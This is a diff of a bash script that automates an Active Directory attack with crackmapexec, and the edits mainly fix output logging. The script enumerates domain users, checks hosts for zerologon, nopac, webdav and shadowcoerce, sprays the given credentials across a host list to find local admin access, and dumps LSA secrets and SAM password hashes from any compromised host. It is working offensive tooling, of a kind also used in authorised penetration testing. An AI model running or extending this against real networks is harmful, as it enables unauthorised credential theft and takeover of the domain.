@@ -143,11 +143,11 @@ crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt | tee -a 
 
 echo 'Cleaning up users...'
 echo "Running: 'cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | sort | tee only-users.txt"
-cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | sort | tee only-users.txt >> $LOGFILE
+cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 | cut -d ' ' -f 1 | sort | tee only-users.txt >> $LOGFILE
 sleep 3
 echo 'Getting domain\users'
 echo 'Running: cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 unparsed-users.txt | sort | tee domain-users.txt'
-cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 unparsed-users.txt | sort | tee domain-users.txt >> $LOGFILE
+cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 | sort | tee domain-users.txt >> $LOGFILE
 
 echo ' '
 echo ' '
@@ -306,14 +306,18 @@ echo 'EXPLOITS' >> $LOGFILE
 echo 'Checking for exploits'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< EXPLOITS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M zerologon | tee vulns.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 -M zerologin | tee vulns.txt | tee -a $LOGFILE
+echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M zerologon' | tee -a vulns.txt
+crackmapexec smb $3 -d $4 -u $1 -p $2 -M zerologin | tee -a vulns.txt | tee -a $LOGFILE
 sleep 5
+echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M nopac' | tee -a vulns.txt
 echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M nopac |tee -a vulns.txt'
 crackmapexec smb $3 -d $4 -u $1 -p $2 -M nopac |tee -a vulns.txt | tee -a $LOGFILE
 sleep 5
+echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M webdav' | tee -a vulns.txt
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M webdav | tee -a vulns.txt'
 crackmapexec smb $3 -d $4 -u $1 -p $2 -M webdav | tee -a vulns.txt | tee -a $LOGFILE
 sleep 5
+echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M shadowcoerce' | tee -a vulns.txt
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M shadowcoerce | tee -a vulns.txt'
 crackmapexec smb $3 -d $4 -u $1 -p $2 -M shadowcoerce | tee -a vulns.txt | tee -a $LOGFILE
 
@@ -411,7 +415,7 @@ echo 'Running: crackmapexec smb '$5' -d '$4' -u '$1' -p '$2' | tee '$1'-local-ad
 
 for line in $(cat $5)
 do
-	crackmapexec smb $line -d $4 -u $1 -p $2 | tee $1-local-admin.txt | tee -a $LOGFILE
+	crackmapexec smb $line -d $4 -u $1 -p $2 | tee -a $1-local-admin.txt | tee -a $LOGFILE
 done
 
 
@@ -421,7 +425,7 @@ done
 		date >> $LOGFILE
 		echo 'DUMPING LSA AND SAM' >> $LOGFILE
 		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa | tee LSA-SAM.txt | tee -a $LOGFILE
-		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee LSA-SAM.txt | tee -a $LOGFILE 
+		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee -a LSA-SAM.txt | tee -a $LOGFILE 
 	else
 		echo 'No local admins, might check --local-auth' | tee -a $LOGFILE
 	fi
